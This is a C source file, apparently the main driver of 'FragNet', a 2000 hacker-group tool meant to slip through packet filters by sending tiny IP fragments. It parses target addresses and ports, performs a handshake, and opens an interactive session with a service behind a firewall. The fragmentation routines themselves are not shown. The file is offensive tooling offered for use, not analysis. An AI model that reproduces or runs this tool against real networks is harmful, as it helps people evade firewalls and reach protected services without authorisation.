/*****************************************************************************
**
**  >----|F|---|R|--|A|--------|G|-|N|------|E|------|T|------>
**
** Purpose:     FragNet tries to break through Packet Filters by sending
**              small IP Fragments.
**
** Last Update: 2000/08/27
**
** Author:  TICK / THC <tick@thehackerschoice.com>
**
** Copyright: GNU Public License
**
*****************************************************************************
**
** YOU don't know me
**                BUT you don't like me
** YOU say you care less how I feel
**                             BUT how many of you that sit and judge me
** [...]
**      -- Homer Joy
**
*****************************************************************************/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <setjmp.h>
#include <sys/types.h>
#include <errno.h>
extern int errno;

#include "fragnet.h"
#include "error.h"


#ifndef TRUE
  #define TRUE  1
  #define FALSE 0
#endif

#define PROMPT  "|FragNet|-> "

#define USAGE(prog) \
{ \
  err_mesg(FATAL, "%s -t <our ip> -i <dest ip> -c <src port> -k <dest port> [-d <debug file>]\n", prog);  \
}  


u_int  fn_errno;
u_int  fn_debug;
FILE   *debug_out;

static sigjmp_buf             procstat;
static volatile sig_atomic_t  sigabort = FALSE;

/*
** reliable Signal Handler Installer
*/
int set_signal(int sig, void (*fkt_ptr) (int));

/*
** Signal Handler for aborting endless Loop
*/
void break_it(int signr)
{
  if(sigabort != TRUE)
    return; /* unexpected occurrence of signal -> ignore */
    
  sigabort = 0;

  siglongjmp(procstat, TRUE);
}

/*
** Print FragNet's Banner
*/
banner(void)
{
  int     iCtr;
  
  /* clear the screen */
  for(iCtr = 0; iCtr < 25; iCtr++)
    printf("\n");
    
  printf("\033[1;31m");
  
  printf("\t    #######                         #     #                \n");
  printf("\t    #        #####     ##     ####  ##    #  ######   #####\n");
  printf("\t    #        #    #   #  #   #    # # #   #  #          #  \n");
  printf("\t    #####    #    #  #    #  #      #  #  #  #####      #  \n");
  printf("\t    #        #####   ######  #  ### #   # #  #          #  \n");
  printf("\t    #        #   #   #    #  #    # #    ##  #          #  \n");
  printf("\t    #        #    #  #    #   ####  #     #  ######     #  \n");
    
  printf("\033[0m");
}


/*
** Main
*/
int main(int argc, char **argv)
{
  int       opt, n;
  char      ibuf[1024], obuf[MAXLOAD];
  char      debfile[255] = { 0 };
  u_short   dport, sport;
  u_long    daddr, saddr;
  u_short   ctrlc;
  

  dport = sport = daddr = saddr = 0;
  opterr = 0;
  while( (opt = getopt(argc, argv, "t:i:c:k:d:")) != EOF)
  {
    switch(opt)
    {
      case 't':
        if(optarg)
          saddr = nameResolve(optarg);
        else
          USAGE(argv[0])
        break;
      case 'i':
        if(optarg)
          daddr = nameResolve(optarg);
        else
          USAGE(argv[0])
        break;
      case 'c':
        if(optarg)
          sport = htons((u_short) atoi(optarg));
        else
          USAGE(argv[0])
        break;
      case 'k':
        if(optarg)
          dport = htons((u_short) atoi(optarg));
        else
          USAGE(argv[0])
        break;
      case 'd':
        if(optarg)
          strncpy(debfile, optarg, sizeof(debfile)-1);
        else
          USAGE(argv[0])
        break;
      default:
        USAGE(argv[0])
    }
  }
  
  if(!saddr || !dport || !daddr)
    USAGE(argv[0])
    
  if(debfile[0])
  {
    if(!strcmp(debfile, "stderr"))
      debug_out = stderr;
    else if(!strcmp(debfile, "stdout"))
      debug_out = stdout;
    else
    {
      if((debug_out = fopen(debfile, "w")) == NULL)
        err_mesg(FATAL_SYS, "ERROR: Can't open File %s\nSYSERR", debfile);
    }
    fn_debug = 1;
  }
    
  if(set_signal(SIGINT, break_it) < 0)
    err_mesg(FATAL_SYS, "Can't set Signal!\nSYSERR");

  setbuf(stdout, NULL);

  /*
  ** print banner
  */
  banner();
  printf("\n\n\t\t\t-> %s:%hu\n", hostLookup(daddr), ntohs(dport));

  /*
  ** Start
  */
  DEBUG("INIT\n")
  fragnet_init(saddr, daddr, sport, dport);
  DEBUG("HANDSHAKE\n")
  if(fragnet_hndshk() < 0)
  {
    fragnet_error(fn_errno);
    exit(1);
  }

  ctrlc = 0;
  if(sigsetjmp(procstat, TRUE))
  {
    sigabort = TRUE;
    
    switch(ctrlc)
    {
      case 0:
        printf("\n\n\tcought SIGINT -> try to FIN-shutdown the connection...\n");
        ctrlc++;
        goto fin;
      case 1:
        printf("\n\n\tcought SIGINT -> try to RST-shutdown the connection...\n");
        ctrlc++;
        goto rst;
      default:
        printf("\n\n\tcought SIGINT -> exit...\n");
        goto end;
    }
  }
  sigabort = TRUE;
  
  printf("\nPress <CTRL-C> to abort sending!\n");

  /*
  ** First we check if the Server send something to us, like a Welcome
  ** Message, (i.e. Sendmail) or not (i.e. fingerd)
  */  
  DEBUG("RECV WELCOME MSG\n")
  sleep(2); // let's wait a bit
  if(fragnet_recv(obuf, NONBLOCK) < 0)
  {
    fragnet_error(fn_errno);
    if(fn_errno == FNE_BLOCK)
      err_mesg(WARN_SYS, "SYSERR");
  }
  if(obuf)
    printf("%s", obuf);  
      
  /*
  ** Now let's start the interaktive Communication.
  */
  do
  {
    fn_errno = errno = 0;
    bzero(obuf, MAXLOAD);
    bzero(ibuf, sizeof(ibuf));
    
    printf(PROMPT);
    if((n = read(STDIN_FILENO, ibuf, sizeof(ibuf)-2)) < 0)
    {
      err_mesg(WARN_SYS, "ERROR: read()\nSYSERR");
      continue;
    }

    /*
    ** Convert to NET ASCII
    */
    DEBUG("fragnet: convert to NET ASCII\n")
    ibuf[n-1] = '\r';
    ibuf[n]   = '\n';
    ibuf[n+1] = '\0';

    /*
    ** Let's send our Data to the Server
    */
    DEBUG("SEND\n")
    if(fragnet_send(ibuf, (u_int) strlen(ibuf)+1) < 0) /* plus terminating \0 */
    {
      if(fragnet_error(fn_errno))
        goto rst;
    }

    /*
    ** So, Time to get the Response.
    ** We use blocking Mode, but the Timeout Value.
    */
    DEBUG("RECV\n")
    if(fragnet_recv(obuf, 0) < 0)
    {
      if(fragnet_error(fn_errno))
        goto rst;
    }
    
    if(obuf)
      printf("%s", obuf);
  
  } while(TRUE);  
  

  DEBUG("ABORTED\n")

  /*
  ** FIN and RST shutdown
  */
fin:
  DEBUG("FIN-SHUTDOWN\n");
  fn_errno = errno = 0;
  if(fragnet_finshtdwn() < 0)
    fragnet_error(fn_errno); /* error occurs -> RST shutdown */
  else
    goto end;
    
rst:
  DEBUG("RST-SHUTDOWN\n");
  fn_errno = errno = 0;
  if(fragnet_rstshtdwn() < 0)
    fragnet_error(fn_errno);
                    
  /*
  ** We are done, so let's clean up.
  */
end:
  fragnet_close();
  
  exit(0);
}
